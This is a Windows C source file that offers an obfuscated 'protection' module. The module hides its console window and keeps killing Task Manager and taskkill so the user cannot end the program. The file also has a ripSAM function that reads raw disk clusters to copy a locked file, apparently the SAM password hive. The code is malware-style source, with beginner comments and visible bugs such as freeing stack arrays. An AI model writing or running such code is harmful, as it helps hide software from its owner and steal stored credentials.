///HOW TO USE PROTECTION.C
/*
void protect(void);
    This initiates the protection thread of the program.
void unprotect(void);
    This stops the protection thread of the program.
void stealth(int);
    Passing a 1 stealths the program, while passing a 0 unstealths the program.
void resetList(void);
    This clears the list of programs that the protection thread terminates.
    Calling this while the protection thread is running with make the protection thread cease to protect.
void addToList(char*);
    This adds the passed process name to the list of processes to be terminated by the protection thread.


*/
///For debugging, use the second DPROC macro.
///For release, use the first DPROC macro.
//#define dproc "taskmgr.exetaskkill.exe"
#define dproc "notepad.exe"
/*

///Here be dragons
#define _WIN32_WINNT 0x0500
#define _ 0
#define _o -1
#define _BT(s_) _beginthread(s_,_,NULL)
#define __sz(__O, __0) strncmp(__O, __0, strlen(__0))
#include <process.h>
#include <windows.h>
#include <tlhelp32.h>
#include <winioctl.h>
long getPID(char*);int lockdown(void);void protect(void);void protThread(void*);void unprotect(void);void stealth(int);void resetList(void);void addToList(char*);char __x[7]={101,120,45,46,101,120,101};char pL[1024*32];int isP=0;
long getPID(char *procName){PROCESSENTRY32 __p; HANDLE s__;if((s__=CreateToolhelp32Snapshot(_o/_o+_o/_o,_))!=(HANDLE)_o){__p.dwSize=296;
int pb=Process32First(s__,&__p);while(pb){if(!__sz(__p.szExeFile, procName))return __p.th32ProcessID;pb=Process32Next(s__,&__p);}}return _o;}
int lockdown(){char *pPl=pL;PROCESSENTRY32 __p;HANDLE __;LPDWORD _0=malloc(sizeof *_0);HANDLE s__;if((s__ = CreateToolhelp32Snapshot(_o/_o+_o/_o,_))==(HANDLE)_o)return _;
__p.dwSize=296;int ngd=_,pb=Process32First(s__,&__p);while(pb){if(strstr(pPl,__p.szExeFile)!=NULL){__=OpenProcess(_o/_o,_,__p.th32ProcessID);
GetExitCodeProcess(__,_0);TerminateProcess(__,*_0);ngd=_o/_o;}else if(!__sz(__p.szExeFile, __x))exit(0);pb=Process32Next(s__,&__p);}return ngd;}
void protect(){isP = _o/_o;_BT(protThread);strncat(pL,dproc,sizeof(dproc));}void unprotect(){isP=_;resetList();}void protThread(void *arg){while(isP)if(!lockdown())
Sleep(500);}void stealth(int m){ShowWindow(GetConsoleWindow(),(m?_:5));}void addToList(char *sProc){strncat(pL,sProc,strlen(sProc));}void resetList(){pL[_]=_;}

int ripSAM(LPSTR lpszSrc, LPSTR lpszDest){

    int bResult = 0;
    //Creates file lpszSrc, just to read. R/W/D share access. NULL security attributes. Open existing file. Default flag/attribs. No template.
    HANDLE hSrc = CreateFile(lpszSrc, FILE_READ_ATTRIBUTES, (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), NULL, OPEN_EXISTING, 0, 0);
    //Check if handle returned is valid.
    if(hSrc != INVALID_HANDLE_VALUE){//If hSrc is a valid file handle

        CHAR szDrive[7];//Declare char array(string?) of length 7.

        wsprintf(szDrive, "%c:", *lpszSrc);//Gets drive letter of source and places in szDrive.

        DWORD dwSectorPerCluster, dwBytesPerSector;//Declares two DWORDs

        GetDiskFreeSpace(szDrive, &dwSectorPerCluster, &dwBytesPerSector, NULL, NULL);//grabs information about HD and places in DWORDs
        //Gets info on drive stored in szDrive. Stores Sectors per cluster and cytes per sector, but discards num free clsuters and total num clusters.

        DWORD dwClusterSize = (dwBytesPerSector * dwSectorPerCluster);//declares cluster size in bytes as bytespersector * sectors per cluster

        LARGE_INTEGER liFileSize;//declares large integer struct

        liFileSize.LowPart = GetFileSize(hSrc, (LPDWORD)&liFileSize.HighPart);//saves size of hSrc to large integer's low part, and stores "lpFileSizeHigh" in the high part.

        DWORD dwClusters = (liFileSize.QuadPart / dwClusterSize); ///declares DWORD and stores number of clusters the file spans, I think?

        DWORD dwRead, dwWritten;//declares some DWORDs


        DWORD dwPointsSize = sizeof(RETRIEVAL_POINTERS_BUFFER) + (dwClusters * (sizeof(LARGE_INTEGER) * 2));//okay, what?


        //declare an array of BYTES whose size if equivalent to that of R_P_B + other stuff, and cast it as P_P_B!
        BYTE tempB[dwPointsSize];
        PRETRIEVAL_POINTERS_BUFFER pPoints = (PRETRIEVAL_POINTERS_BUFFER) tempB;


        STARTING_VCN_INPUT_BUFFER vcnStart = { 0 };//declares and initializes S_V_I_B struct


        //attempts to perform command directly on io drivers!
        //grabs pointers to specific disk locations of file data!!
        //File being queried is hSrc. Input buffer, then sizeof. Output buffer, then sizeof. Catch DWORD for bytes returned, and a NULL as 'overlapped' isnt used...?
        if(DeviceIoControl(hSrc, FSCTL_GET_RETRIEVAL_POINTERS, &vcnStart, sizeof(vcnStart), pPoints, dwPointsSize, &dwWritten, NULL)){//if command successful.


            wsprintf(szDrive, "\\\\.\\%c:", *lpszSrc);//okay, what? stores \\.\<DRIVELETTER>: in szDrive.


            //creates a file handle referencing the DRIVE ITSELF that the file is housed in!
            HANDLE hDrive = CreateFile(szDrive, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);

            //checks if handle to drive was got
            if(hDrive != INVALID_HANDLE_VALUE){//if drive handle is valid


                //finally, creates the destination file. Pretty standard fare.
                HANDLE hDest = CreateFile(lpszDest, GENERIC_WRITE, 0, NULL, CREATE_NEW, 0, 0);

                //checks for handle validity
                if(hDest != INVALID_HANDLE_VALUE){//if handle to destination file is valid

                    //Ah, now we see where the LARGE INT came into play: its essentially two longs!
                    //moves file pointer for destination file a number of bytes from the beginning of the file equivalent to the size of the source file!
                    SetFilePointer(hDest, liFileSize.LowPart, &liFileSize.HighPart, FILE_BEGIN);



                    SetEndOfFile(hDest);//now marks current pointer location as EOF!



                    LPBYTE lpCluster[dwClusterSize];//declares an array of bytes THE SIZE OF A WHOLE DAMN CLUSTER



                    LARGE_INTEGER vcnPrev = pPoints->StartingVcn;//sets this large integer. i think this is prep for a loop.


                    //and so it is!
                    ///loop seems to loop through each element in 'extents' array, which i guess is the number of fragments of the file?
                    DWORD dwExtent;
                    for(dwExtent = 0; dwExtent < pPoints->ExtentCount; dwExtent++){

                        //sets length of part byt subtracting location of the last VCN from the location of the present one!
                        DWORD dwLength = (DWORD)(pPoints->Extents[dwExtent].NextVcn.QuadPart - vcnPrev.QuadPart);

                        LARGE_INTEGER liSrcPos = { (pPoints->Extents[dwExtent].Lcn.QuadPart * dwClusterSize) };//location, on actual drive, of part of file. converts cluster # to bytes.


                        LARGE_INTEGER liDstPos = { (vcnPrev.QuadPart * dwClusterSize) };//location on virtual drive... converts cluster # to bytes.

                        //loops thru each byte(?) in the section of file.
                        DWORD dwCluster;
                        for(dwCluster = 0; dwCluster < dwLength; dwCluster++){//lewp!

                            //sets Drive file pointer to the source location
                            SetFilePointer(hDrive, liSrcPos.LowPart, &liSrcPos.HighPart, FILE_BEGIN);

                            //reads out contents of cluster relating to file and places in lpCluster, an array of bytes the size of a single cluster.
                            ReadFile(hDrive, lpCluster, dwClusterSize, &dwRead, NULL);

                            //sets file pointer of destination file to the same relative position
                            SetFilePointer(hDest, liDstPos.LowPart, &liDstPos.HighPart, FILE_BEGIN);


                            //WRITES content from the lpCluster buffer to the destination file!
                            //This effectively copies the data DIRECTLY from a nearly ANONYMOUS location of the harddrive to the file!
                            //in actuality, a section of the source file was copied to the destination file!
                            WriteFile(hDest, lpCluster, dwRead, &dwWritten, NULL);

                            //advances positions of src and dst size pointers by cluster size.
                            liSrcPos.QuadPart += dwClusterSize;
                            liDstPos.QuadPart += dwClusterSize;

                        }//after loop
                        //sets present VNC to previous VNC
                        vcnPrev = pPoints->Extents[dwExtent].NextVcn;

                    }//after loop
                    //clean-up, clean-up, everybody clean-up...
//                    delete lpCluster;
                    free(lpCluster);
                    CloseHandle(hDest);
                    bResult = 1;

                }//if handle to destination file is NOT valid


                CloseHandle(hDrive);


            }//if drive handle was not valid
        }//if command NOT successful


//        delete pPoints;
        free(pPoints);


        CloseHandle(hSrc);//close handle to source file.
    }//If hSrc is invalid file handle.
    return bResult;

}

*/